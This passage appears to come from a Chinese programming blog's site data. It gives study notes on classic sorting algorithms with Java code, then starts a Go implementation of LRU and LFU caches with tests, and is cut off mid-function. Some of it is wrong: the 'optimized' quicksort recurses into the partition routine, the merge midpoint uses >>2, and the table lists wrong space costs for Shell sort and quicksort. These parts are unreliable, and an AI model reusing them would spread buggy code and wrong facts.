b=甲\n\n异或运算还可以用来消除出现偶数次的值\n选择排序\n首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。\n再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。\n重复第二步，直到所有元素均排序完毕。\n\n时间复杂度 O(n^2)\npublic static int[] selectionSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 总共经过n-1次比较    for (int i = 0; i &lt; arr.length - 1; i++) &#123;        // 选定i下标的值作为比较的基准        int temp = i;        // 在i~n-1上找最小值的下标        for (int j = i + 1; j &lt; arr.length; j++) &#123;            if (arr[j] &lt; arr[temp]) &#123;                temp = j;            &#125;        &#125;        // 将最小值与i上元素交换        if (i != temp) &#123;            swap(arr, i, temp);        &#125;    &#125;    return arr;&#125;\n\n冒泡排序\n比较相邻的元素。如果第一个比第二个大，就交换他们两个。\n对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。\n针对所有的元素重复以上的步骤，除了最后一个。\n持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。\n\n时间复杂度 O(n^2)\npublic static int[] bubbleSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    for (int i = 0; i &lt; array.length - 1; i++) &#123;        // （优化）设定一个标记，为true表示此次循环没有交换，即已排序完成        boolean flag = true;        for (int j = 0; j &lt; array.length - i - 1; j++) &#123;            if (arr[j] &gt; arr[j + 1]) &#123;                swap(arr, j, j + 1);                flag = false;            &#125;        &#125;        if (flag) &#123;            break;        &#125;    &#125;    return arr;&#125;\n\n插入排序\n将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。\n从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。\n\n时间复杂度 O(n^2)\npublic static int[] insertionSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 从下标为1的元素开始选择插入位置，下标为0只有一个元素，默认是有序的    for (int i = 1; i &lt; arr.length; i++) &#123;        // 从右往左比较，左边的元素比右边大时，交换        for (int j = i - 1; j &gt;= 0 &amp;&amp; arr[j] &gt; arr[j + 1]; j--) &#123;            swap(arr, j, j + 1);        &#125;    &#125;    return arr;&#125;\n\n希尔排序（插入排序的改进）希尔排序是基于插入排序的以下两点性质而提出改进方法的：插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位；希尔排序的基本思想是：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录”基本有序”时，再对全体记录进行依次直接插入排序。时间复杂度 O(nlog2n)\npublic static int[] shellSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int temp;    // 每次增量为数组长度的一半，以后每次减半    for (int step = arr.length / 2; step &gt;= 1; step /= 2) &#123;        for (int i = step; i &lt; arr.length; i++) &#123;            temp = arr[i];            int j = i - step;            while (j &gt;= 0 &amp;&amp; arr[j] &gt; temp) &#123;                arr[j + step] = arr[j];                j -= step;            &#125;            arr[j + step] = temp;        &#125;    &#125;    return arr;&#125;\n\n\n归并排序归并排序\n申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；\n设定两个指针，最初位置分别为两个已经排序序列的起始位置；\n比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；\n重复步骤 3 直到某一指针达到序列尾；\n将另一序列剩下的所有元素直接复制到合并序列尾。\n\n时间复杂度 O(nlogn)空间复杂度 O(n)\npublic static int[] mergeSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 临时数组，用于存放排序后的数组    int[] tempArray = new int[array.length];    merge(arr, tempArray, 0, array.length - 1);    return arr;&#125;private static void merge(int[] array, int[] tempArray, int start, int end) &#123;    if (start &gt;= end) &#123;        return;    &#125;    int mid = start + ((end - start) &gt;&gt; 2);    int start1 = start;    int end1 = mid;    int start2 = mid + 1;    int end2 = end;    merge(array, tempArray, start1, end1);    merge(array, tempArray, start2, end2);    int temp = start;    // 比较两个数组元素，将较小的放到合并空间。直至其中一个数组遍历结束    while (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2) &#123;        tempArray[temp++] = array[start1] &lt; array[start2] ? array[start1++] : array[start2++];    &#125;    // 将剩余元素添加至合并空间末尾    while (start1 &lt;= end1) &#123;        tempArray[temp++] = array[start1++];    &#125;    while (start2 &lt;= end2) &#123;        tempArray[temp++] = array[start2++];    &#125;    // 拷贝合并空间内排序结束的数组至原数组    for (temp = start; temp &lt;= end; temp++) &#123;        array[temp] = tempArray[temp];    &#125;&#125;\n\n归并排序拓展逆序对问题在一个数组中，每一个数右边比当前数小的数，与这个数组成一个逆序对。如数组 1，3，4，2，5逆序对为 3,2 4,2即求 右边有多少个数比当前数小\npublic static int reverse(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int[] tempArray = new int[arr.length];    return mergeReverse(arr, tempArray, 0, arr.length - 1);&#125;private static int mergeReverse(int[] array, int[] tempArray, int start, int end) &#123;    if (start &gt;= end) &#123;        return 0;    &#125;    int mid = start + ((end - start) &gt;&gt; 2);    int start1 = start;    int end1 = mid;    int start2 = mid + 1;    int end2 = end;    int result = 0;    int temp = start;    result += mergeReverse(array, tempArray, start1, end1);    result += mergeReverse(array, tempArray, start2, end2);    // 比较两个数组元素，将较小的放到合并空间。直至其中一个数组遍历结束    while (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2) &#123;        result += array[start1] &lt;= array[start2] ? 0 : (end2 - start2 + 1);        tempArray[temp++] = array[start1] &gt; array[start2] ? array[start1++] : array[start2++];    &#125;    // 将剩余元素添加至合并空间末尾    while (start1 &lt;= end1) &#123;        tempArray[temp++] = array[start1++];    &#125;    while (start2 &lt;= end2) &#123;        tempArray[temp++] = array[start2++];    &#125;    // 拷贝合并空间内排序结束的数组至原数组    for (temp = start; temp &lt;= end; temp++) &#123;        array[temp] = tempArray[temp];    &#125;    System.out.println(Arrays.toString(tempArray));    return result;&#125;\n\n小和问题在一个数组中，每一个数左边比当前数小的数累加起来，叫做这个数组的小和。求一个数组的小和。如数组 1，3，4，2，5小和为 1 + 1+3 + 1 + 1+3+4+2 &#x3D; 16即求 右边有多少个数比当前数大\npublic static int smallSum(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int[] tempArray = new int[arr.length];    return mergeSmallSum(arr, tempArray, 0, arr.length - 1);&#125;private static int mergeSmallSum(int[] array, int[] tempArray, int start, int end) &#123;    if (start &gt;= end) &#123;        return 0;    &#125;    int mid = start + ((end - start) &gt;&gt; 2);    int start1 = start;    int end1 = mid;    int start2 = mid + 1;    int end2 = end;    int result = 0;    int temp = start;    result += mergeSmallSum(array, tempArray, start1, end1);    result += mergeSmallSum(array, tempArray, start2, end2);    // 比较两个数组元素，将较小的放到合并空间。直至其中一个数组遍历结束    while (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2) &#123;        result += array[start1] &lt; array[start2] ? (end2 - start2 + 1) * array[start1] : 0;        tempArray[temp++] = array[start1] &lt; array[start2] ? array[start1++] : array[start2++];    &#125;    // 将剩余元素添加至合并空间末尾    while (start1 &lt;= end1) &#123;        tempArray[temp++] = array[start1++];    &#125;    while (start2 &lt;= end2) &#123;        tempArray[temp++] = array[start2++];    &#125;    // 拷贝合并空间内排序结束的数组至原数组    for (temp = start; temp &lt;= end; temp++) &#123;        array[temp] = tempArray[temp];    &#125;    return result;&#125;\n\n快速排序荷兰国旗问题（前置）给定一个整数数组，给定一个值K，这个值在原数组中一定存在要求把数组中小于K的元素放到数组的左边，大于K的元素放到数组的右边，等于K的元素放到数组的中间\n做法是用两个数组下标作为边界，将数组分成三个区域，左边是小于k的元素，中间是等于k的元素，右边是大于k的元素不断将元素与边界交换，实现划分\npublic static int[] partition(int[] array, int key) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int l = -1, r = arr.length, i = 0;    while (i &lt; r) &#123;        if (arr[i] &lt; key) &#123;            // 小于时，交换左边界+1的元素，左边界l+1，判断下一个元素（交换过来元素都已经过判断）            swap(arr, ++l, i++);        &#125; else if (arr[i] &gt; key) &#123;            // 大于时，交换有边界-1的元素，右边界r-1，判断原位置，因为交换后的元素未经过判断            swap(arr, --r, i);        &#125; else &#123;            // 相等时，什么都不做，判断下一个元素            i++;        &#125;    &#125;    return arr;&#125;\n\n快速排序\n从数列中挑出一个元素，称为 “基准”（pivot）;\n重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；\n递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；\n\n类似荷兰国旗问题时间复杂度 O(n^2)空间复杂度 O(logn)但它的平摊期望时间是O(nlongn)，而且隐含的常数因子很小，比归并小很多。所以对绝大多数顺序性较弱的随机数列来说，快排优于归并\npublic static int[] quickSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    return quickSortProcess(arr, 0, arr.length - 1);&#125;/** * 递归调用划分函数进行排序 */private static int[] quickSortProcess(int[] arr, int l, int r) &#123;    if (l &lt; r) &#123;        int partitionIndex = partition(arr, l, r);        quickSortProcess(arr, l, partitionIndex - 1);        quickSortProcess(arr, partitionIndex + 1, r);    &#125;    return arr;&#125;/** * 选取基准值，进行划分 */private static int partition(int[] arr, int l, int r) &#123;    // 选取基准值    int pivot = l;    int index = pivot + 1;    for (int i = index; i &lt;= r; i++) &#123;        if (arr[i] &lt; arr[pivot]) &#123;            swap(arr, i, index);            index++;        &#125;    &#125;    swap(arr, pivot, index - 1);    return index - 1;&#125;/** * 递归调用划分函数进行排序（优化） * 优化了等于基准的部分，使得每次排序时，一次可以排所有等于基准的元素。比之前每次只排基准好一些。 * 但也只是针对有重复元素的排序 */private static int[] quickSortProcessOptimization(int[] arr, int l, int r) &#123;    if (l &lt; r) &#123;        int[] partitionIndex = partitionOptimization(arr, l, r);        partitionOptimization(arr, l, partitionIndex[0]);        partitionOptimization(arr, partitionIndex[1], r);    &#125;    return arr;&#125;/** * 选取基准值，进行划分（优化） */private static int[] partitionOptimization(int[] arr, int l, int r) &#123;    // 选取基准值    int pivot = l;    r++;    int i = l + 1;    while (i &lt; r) &#123;        if (arr[i] &lt; arr[pivot]) &#123;            // 小于时，交换左边界+1的元素，左边界l+1，判断下一个元素（交换过来元素都已经过判断）            swap(arr, ++l, i++);        &#125; else if (arr[i] &gt; arr[pivot]) &#123;            // 大于时，交换有边界-1的元素，右边界r-1，判断原位置，因为交换后的元素未经过判断            swap(arr, --r, i);        &#125; else &#123;            // 相等时，什么都不做，判断下一个元素            i++;        &#125;    &#125;    swap(arr, pivot, l--);    return new int[]&#123;l, r&#125;;&#125;\n\n堆排序\n创建一个堆 H[0……n-1]；\n把堆首（最大值）和堆尾互换；\n把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；\n重复步骤 2，直到堆的尺寸为 1。\n\n时间复杂度 O(nlogn)\npublic static int[] heapSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    int len = arr.length;    /* 创建大根堆    从最后一个父节点（即len/2的位置）开始进行 heapify 过程     */    for (int i = len / 2; i &gt;= 0; i--) &#123;        heapify(arr, i, len);    &#125;    /* 排序    将最大的根与堆尾交换，同时堆尺寸减一，即排好最大的    然后再重新与子节点比较，将大的值换到根     */    for (int i = len - 1; i &gt; 0; i--) &#123;        swap(arr, 0, i);        len--;        heapify(arr, 0, len);    &#125;    return arr;&#125;/** * 使得一个数组是堆有序的，即根节点的值大于（小于）左右子节点的值 */private static void heapify(int[] arr, int i, int len) &#123;    // 左节点    int left = 2 * i + 1;    // 右节点    int right = 2 * i + 2;    // 父节点    int largest = i;    if (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;        largest = left;    &#125;    if (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;        largest = right;    &#125;    if (largest != i) &#123;        swap(arr, i, largest);        heapify(arr, largest, len);    &#125;&#125;\n\n基数排序一种非比较型整数排序算法其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。时间复杂度 O(k*n)空间复杂度 O(k+n)\npublic static int[] radixSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 获取最大值    int max = arr[0];    for (int j : arr) &#123;        if (max &lt; j) &#123;            max = j;        &#125;    &#125;    // 获取最高位数    int maxDigit = 0;    if (max == 0) &#123;        maxDigit = 1;    &#125; else &#123;        for (int i = max; i != 0; i /= 10) &#123;            maxDigit++;        &#125;    &#125;    // 排序    int mod = 10;    int dev = 1;    for (int i = 0; i &lt; maxDigit; i++, dev *= 10, mod *= 10) &#123;        // 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)        int[][] counter = new int[mod * 2][0];        for (int k : arr) &#123;            int bucket = ((k % mod) / dev) + mod;            counter[bucket] = arrayAppend(counter[bucket], k);        &#125;        int pos = 0;        for (int[] bucket : counter) &#123;            for (int value : bucket) &#123;                arr[pos++] = value;            &#125;        &#125;    &#125;    return arr;&#125;/** * 自动扩容，并保存数据 */private static int[] arrayAppend(int[] arr, int value) &#123;    arr = Arrays.copyOf(arr, arr.length + 1);    arr[arr.length - 1] = value;    return arr;&#125;\n\n计数排序\n找出待排序的数组中最大和最小的元素\n统计数组中每个值为i的元素出现的次数，存入数组C的第i项\n对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）\n反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1\n\n时间复杂度 O(n+k)空间复杂度 O(k)空间换时间\npublic static int[] countingSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 获取最大、最小值    int min = arr[0];    int max = arr[0];    for (int value : arr) &#123;        if (min &gt; value) &#123;            min = value;        &#125;        if (max &lt; value) &#123;            max = value;        &#125;    &#125;    // 处理负数的情况    int difference = 0;    if (min &lt; 0) &#123;        difference = -min;    &#125;    for (int i = 0; i &lt; arr.length; i++) &#123;        arr[i] += difference;    &#125;    // 排序    int[] bucket = new int[max + difference + 1];    for (int value : arr) &#123;        bucket[value]++;    &#125;    int socketIndex = 0;    for (int i = 0; i &lt; bucket.length; i++) &#123;        while (bucket[i] &gt; 0) &#123;            arr[socketIndex++] = i - difference;            bucket[i]--;        &#125;    &#125;    return arr;&#125;\n\n桶排序（计数排序的升级）利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：在额外空间充足的情况下，尽量增大桶的数量使用的映射函数能够将输入的 N 个数据均匀的分配到 K 个桶中时间复杂度 O(n+k)空间复杂度 O(n*k)\npublic static int[] bucketSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 获取最大、最小值    int min = arr[0];    int max = arr[0];    for (int value : arr) &#123;        if (min &gt; value) &#123;            min = value;        &#125;        if (max &lt; value) &#123;            max = value;        &#125;    &#125;    // 桶的数量    int bucketSize = 5;    int bucketCount = (max - min) / bucketSize + 1;    int[][] buckets = new int[bucketCount][0];    // 利用函数映射关系将数据分配到各个桶中    for (int j : arr) &#123;        int index = (j - min) / bucketSize;        buckets[index] = arrayAppend(buckets[index], j);    &#125;    // 对每个桶进行排序    int arrIndex = 0;    for (int[] bucket : buckets) &#123;        if (bucket.length &lt;= 0) &#123;            continue;        &#125;        // 使用了冒泡排序        bucket = bubbleSort(bucket);        for (int value : bucket) &#123;            arr[arrIndex++] = value;        &#125;    &#125;    return arr;&#125;\n\n对数器对数器（通过用大量测试数据来验证算法是否正确的一种方式）：1.有一个你想要测的方法a；2.实现一个绝对正确但是复杂度不好的方法b；3.实现一个随机样本产生器；4.实现对比算法a和b的方法；5.把方法a和方法b比对多次来验证方法a是否正确；6.如果有一个样本使得比对出错，打印样本分析是哪个方法出错；7.当样本数量很多时比对测试依然正确，可以确定方法a已经正确。\n这里附上一个对数器以Java提供的数组排序作为参照，以检验算法的正确性。\npublic void sortTest() &#123;    int[] a = new int[1000];    for (int i = 0; i &lt; 1000; i++) &#123;        a[i] = (int) (-1000 * Math.random() + 500);    &#125;    System.out.println(Arrays.toString(Sort.insertionSort(a)));    System.out.println(Arrays.toString(Sort.bubbleSort(a)));    System.out.println(Arrays.toString(Sort.selectionSort(a)));    System.out.println(Arrays.toString(Sort.mergeSort(a)));    System.out.println(Arrays.toString(Sort.quickSort(a)));    System.out.println(Arrays.toString(Sort.heapSort(a)));    System.out.println(Arrays.toString(Sort.radixSort(a)));    System.out.println(Arrays.toString(Sort.countingSort(a)));    System.out.println(Arrays.toString(Sort.bucketSort(a)));    System.out.println(Arrays.toString(Sort.shellSort(a)));    Arrays.sort(a);    System.out.println(Arrays.toString(a));&#125;\n\n总结参考：菜鸟教程 ，有更详细的解释以及各种编程语言对各个算法的实现。\n关于桶排序基数排序与计数排序、桶排序这三种排序算法都利用了桶的概念，但对桶的使用方式不同基数排序：根据键值的每位数字来分配桶；计数排序：每个桶只存储单一键值；桶排序：每个桶存储一定范围的数值；\n关于算法稳定性排序算法的稳定性同样值的个体之间，如果不因为排序而改变相对次序，就是这个排序是有稳定性的；否则就没有。\n不具备稳定性的排序：选择排序、快速排序、堆排序、希尔排序\n具备稳定性的排序：冒泡排序、插入排序、归并排序、一切桶排序思想下的排序\n各个算法时间复杂度、空间复杂度和稳定性：\n\n\n\n排序算法\n平均时间复杂度\n辅助空间\n稳定性\n\n\n\n选择排序\nO(n^2)\nO(1)\n不稳定\n\n\n冒泡排序\nO(n^2)\nO(1)\n稳定\n\n\n插入排序\nO(n^2)\nO(1)\n稳定\n\n\n希尔排序\nO(nlogn)\nO(nlogn)\n不稳定\n\n\n归并排序\nO(nlogn)\nO(n)\n稳定\n\n\n快速排序\nO(nlogn)\nO(nlogn)\n不稳定\n\n\n堆排序\nO(nlogn)\nO(1)\n不稳定\n\n\n基数排序\nO(n*k)\nO(n+k)\n稳定\n\n\n计数排序\nO(n+k)\nO(n+k)\n稳定\n\n\n桶排序\nO(n+k)\nO(n+k)\n稳定\n\n\n\n目前没有找到时间复杂度 0(n1ogn) ，额外空间复杂度0(1)，又稳定的排序。（鱼和熊掌不可兼得）基于比较的排序，时间复杂度至少 O(nlogn)稳定的排序，空间复杂度至少 O(n)\n\n综合排序综合排序即将不同排序的优势结合在一起，以实现不同情况下更加高效的排序。\n","categories":["学习笔记"],"tags":["java","算法","排序"]},{"title":"缓存淘汰算法LRU、LFU","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%BC%93%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AE%97%E6%B3%95LRU%E3%80%81LFU/","content":"缓存淘汰算法概述缓存淘汰算法用于在缓存空间不足时决定哪些数据应该被移除，以腾出空间存储新数据。两种最常用的算法是：\n\nLRU (Least Recently Used) - 最近最少使用，根据数据的历史访问记录来进行淘汰数据\nLFU (Least Frequently Used) - 最不经常使用，根据数据的历史访问频率来淘汰数据\n\nLRU (最近最少使用) 算法LRU 基于时间局部性原理，认为最近被访问的数据在将来更有可能被再次访问。当缓存满时，LRU 会淘汰最久未被访问的数据。\nGo 实现\n使用哈希表实现 O(1) 的查找\n使用双向链表维护访问顺序\n每次访问数据时，将其移动到链表头部\n淘汰时从链表尾部移除数据\n\npackage utilsimport (\t&quot;container/list&quot;\t&quot;sync&quot;)// LRUCache 泛型结构体type LRUCache[K comparable, V any] struct &#123;\tcapacity int\tcache    map[K]*list.Element\tlist     *list.List\tmu       sync.RWMutex&#125;// entry 用于存储键值对type entry[K comparable, V any] struct &#123;\tkey   K\tvalue V&#125;// NewLRUCache 创建一个新的泛型LRUCachefunc NewLRUCache[K comparable, V any](capacity int) *LRUCache[K, V] &#123;\treturn &amp;LRUCache[K, V]&#123;\t\tcapacity: capacity,\t\tcache:    make(map[K]*list.Element),\t\tlist:     list.New(),\t&#125;&#125;// Get 获取键的值，如果不存在返回零值和falsefunc (l *LRUCache[K, V]) Get(key K) (V, bool) &#123;\tl.mu.Lock()\tdefer l.mu.Unlock()\tif elem, ok := l.cache[key]; ok &#123;\t\tl.list.MoveToFront(elem)\t\treturn elem.Value.(*entry[K, V]).value, true\t&#125;\tvar zero V\treturn zero, false&#125;// Put 插入或更新键值对func (l *LRUCache[K, V]) Put(key K, value V) bool &#123;\tl.mu.Lock()\tdefer l.mu.Unlock()\tif l.capacity &lt;= 0 &#123;\t\treturn false\t&#125;\tif elem, ok := l.cache[key]; ok &#123;\t\telem.Value.(*entry[K, V]).value = value\t\tl.list.MoveToFront(elem)\t\treturn true\t&#125;\tif l.list.Len() &gt;= l.capacity &#123;\t\t// 移除最久未使用的元素\t\tback := l.list.Back()\t\tif back != nil &#123;\t\t\tdelete(l.cache, back.Value.(*entry[K, V]).key)\t\t\tl.list.Remove(back)\t\t&#125;\t&#125;\tnewEntry := &amp;entry[K, V]&#123;key, value&#125;\telem := l.list.PushFront(newEntry)\tl.cache[key] = elem\treturn true&#125;// Len 返回缓存中元素的数量func (l *LRUCache[K, V]) Len() int &#123;\treturn l.list.Len()&#125;\n\n测试package utilsimport (\t&quot;testing&quot;)func TestLRUCache_EmptyCache(t *testing.T) &#123;\tcache := NewLRUCache[string, int](2)\t// 测试空缓存\tif val, ok := cache.Get(&quot;nonexistent&quot;); ok || val != 0 &#123;\t\tt.Errorf(&quot;Get from empty cache should return zero value, got %v, %v&quot;, val, ok)\t&#125;\tif l := cache.Len(); l != 0 &#123;\t\tt.Errorf(&quot;Len of empty cache should be 0, got %d&quot;, l)\t&#125;&#125;func TestLRUCache_SingleItem(t *testing.T) &#123;\tcache := NewLRUCache[string, int](1)\t// 测试单个元素\tcache.Put(&quot;one&quot;, 1)\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 1 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 1, true&quot;, val, ok)\t&#125;\t// 测试替换\tcache.Put(&quot;two&quot;, 2)\tif val, ok := cache.Get(&quot;one&quot;); ok &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) should be evicted, got %d, %v&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;two&quot;); !ok || val != 2 &#123;\t\tt.Errorf(&quot;Get(&#x27;two&#x27;) = %d, %v, want 2, true&quot;, val, ok)\t&#125;&#125;func TestLRUCache_EvictionPolicy(t *testing.T) &#123;\tcache := NewLRUCache[string, int](2)\t// 初始填充\tcache.Put(&quot;one&quot;, 1)\tcache.Put(&quot;two&quot;, 2)\t// 访问one使其成为最近使用的\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 1 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 1, true&quot;, val, ok)\t&#125;\t// 添加新元素，two应该被淘汰\tcache.Put(&quot;three&quot;, 3)\tif val, ok := cache.Get(&quot;two&quot;); ok &#123;\t\tt.Errorf(&quot;Get(&#x27;two&#x27;) should be evicted, got %d, %v&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 1 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 1, true&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;three&quot;); !ok || val != 3 &#123;\t\tt.Errorf(&quot;Get(&#x27;three&#x27;) = %d, %v, want 3, true&quot;, val, ok)\t&#125;&#125;func TestLRUCache_UpdateExisting(t *testing.T) &#123;\tcache := NewLRUCache[string, int](2)\tcache.Put(&quot;one&quot;, 1)\tcache.Put(&quot;one&quot;, 11) // 更新\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 11 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 11, true&quot;, val, ok)\t&#125;\tif l := cache.Len(); l != 1 &#123;\t\tt.Errorf(&quot;Len should be 1 after update, got %d&quot;, l)\t&#125;&#125;func TestLRUCache_ZeroCapacity(t *testing.T) &#123;\tcache := NewLRUCache[string, int](0)\tcache.Put(&quot;one&quot;, 1)\tif val, ok := cache.Get(&quot;one&quot;); ok &#123;\t\tt.Errorf(&quot;Get from zero-capacity cache should return nothing, got %d, %v&quot;, val, ok)\t&#125;&#125;func TestLRUCache_CustomTypes(t *testing.T) &#123;\ttype customKey struct &#123;\t\tid   int\t\tname string\t&#125;\tcache := NewLRUCache[customKey, string](2)\tkey1 := customKey&#123;1, &quot;apple&quot;&#125;\tkey2 := customKey&#123;2, &quot;banana&quot;&#125;\tcache.Put(key1, &quot;red&quot;)\tcache.Put(key2, &quot;yellow&quot;)\tif val, ok := cache.Get(key1); !ok || val != &quot;red&quot; &#123;\t\tt.Errorf(&quot;Get(key1) = %s, %v, want &#x27;red&#x27;, true&quot;, val, ok)\t&#125;\t// 测试淘汰\tcache.Put(customKey&#123;3, &quot;cherry&quot;&#125;, &quot;pink&quot;)\tif val, ok := cache.Get(key2); ok &#123;\t\tt.Errorf(&quot;Get(key2) should be evicted, got %s, %v&quot;, val, ok)\t&#125;&#125;func TestLRUCache_ConcurrentAccess(t *testing.T) &#123;\tcache := NewLRUCache[string, int](100)\tdone := make(chan bool)\t// 并发写入\tgo func() &#123;\t\tfor i := 0; i &lt; 10000; i++ &#123;\t\t\tcache.Put(&quot;key&quot;, i)\t\t&#125;\t\tdone &lt;- true\t&#125;()\t// 并发读取\tgo func() &#123;\t\tfor i := 0; i &lt; 10000; i++ &#123;\t\t\tcache.Get(&quot;key&quot;)\t\t&#125;\t\tdone &lt;- true\t&#125;()\t&lt;-done\t&lt;-done\t// 最终检查\tif val, ok := cache.Get(&quot;key&quot;); !ok &#123;\t\tt.Errorf(&quot;Key should exist after concurrent access&quot;)\t&#125; else if val &lt; 0 || val &gt;= 10000 &#123;\t\tt.Errorf(&quot;Unexpected value after concurrent access: %d&quot;, val)\t&#125;&#125;\n\nLFU (最不经常使用) 算法LFU 基于访问频率，认为访问次数最少的数据在未来被访问的可能性也最小。当缓存满时，LFU 会淘汰访问频率最低的数据。如果有多个数据具有相同的最低频率，则淘汰其中最久未被访问的数据。\nGo 实现\n使用两个哈希表：一个存储键值对，一个存储频率到键列表的映射\n使用双向链表维护相同频率下的访问顺序\n需要维护一个最小频率变量\n\npackage utilsimport (\t&quot;container/list&quot;\t&quot;sync&quot;)// LFUCache 泛型结构体type LFUCache[K comparable, V any] struct &#123;\tcapacity int\tminFreq  int\titems    map[K]*list.Element     // 存储键到元素的映射\tfreqs    map[int]*list.List      // 存储频率到双向链表的映射\tentries  map[K]*cacheEntry[K, V] // 存储键到entry的映射(辅助快速访问)\tmu       sync.RWMutex&#125;// cacheEntry 存储缓存值和频率信息type cacheEntry[K comparable, V any] struct &#123;\tkey    K\tvalue  V\tfreq   int\tparent *list.Element&#125;// NewLFUCache 创建一个新的泛型LFUCachefunc NewLFUCache[K comparable, V any](capacity int) *LFUCache[K, V] &#123;\treturn &amp;LFUCache[K, V]&#123;\t\tcapacity: capacity,\t\titems:    make(map[K]*list.Element),\t\tfreqs:    make(map[int]*list.List),\t\tentries:  make(map[K]*cacheEntry[K, V]),\t&#125;&#125;// Get 获取键的值，如果不存在返回零值和falsefunc (l *LFUCache[K, V]) Get(key K) (V, bool) &#123;\tl.mu.Lock()\tdefer l.mu.Unlock()\tif elem, ok := l.items[key]; ok &#123;\t\tentry := elem.Value.(*cacheEntry[K, V])\t\tl.incrementFreq(elem, entry)\t\treturn entry.value, true\t&#125;\tvar zero V\treturn zero, false&#125;// Put 插入或更新键值对func (l *LFUCache[K, V]) Put(key K, value V) bool &#123;\tl.mu.Lock()\tdefer l.mu.Unlock()\tif l.capacity &lt;= 0 &#123;\t\treturn false\t&#125;\t// 如果键已存在，更新值并增加频率\tif elem, ok := l.items[key]; ok &#123;\t\tentry := elem.Value.(*cacheEntry[K, V])\t\tentry.value = value\t\tl.incrementFreq(elem, entry)\t\treturn true\t&#125;\t// 如果缓存已满，移除最不经常使用且最久未使用的项\tif len(l.items) &gt;= l.capacity &#123;\t\tl.removeMinFreqItem()\t&#125;\t// 创建新条目\tentry := &amp;cacheEntry[K, V]&#123;\t\tkey:   key,\t\tvalue: value,\t\tfreq:  1,\t&#125;\t// 添加到频率为1的列表中\tif l.freqs[1] == nil &#123;\t\tl.freqs[1] = list.New()\t&#125;\telem := l.freqs[1].PushFront(entry)\tentry.parent = elem\t// 更新映射\tl.items[key] = elem\tl.entries[key] = entry\t// 更新最小频率\tl.minFreq = 1\treturn true&#125;// incrementFreq 增加条目的频率func (l *LFUCache[K, V]) incrementFreq(elem *list.Element, entry *cacheEntry[K, V]) &#123;\t// 从当前频率列表中移除\tl.freqs[entry.freq].Remove(elem)\t// 更新频率\tentry.freq++\t// 添加到新频率列表中\tif l.freqs[entry.freq] == nil &#123;\t\tl.freqs[entry.freq] = list.New()\t&#125;\tnewElem := l.freqs[entry.freq].PushFront(entry)\tentry.parent = newElem\t// 更新items映射\tl.items[entry.key] = newElem\t// 如果旧频率是最小频率且该频率列表现在为空，更新最小频率\tif entry.freq-1 == l.minFreq &amp;&amp; l.freqs[entry.freq-1].Len() == 0 &#123;\t\tl.minFreq = entry.freq\t&#125;&#125;// removeMinFreqItem 移除最小频率的项func (l *LFUCache[K, V]) removeMinFreqItem() &#123;\tminList := l.freqs[l.minFreq]\tif minList == nil &#123;\t\treturn\t&#125;\t// 移除列表中的最后一个元素(最久未使用)\tback := minList.Back()\tif back == nil 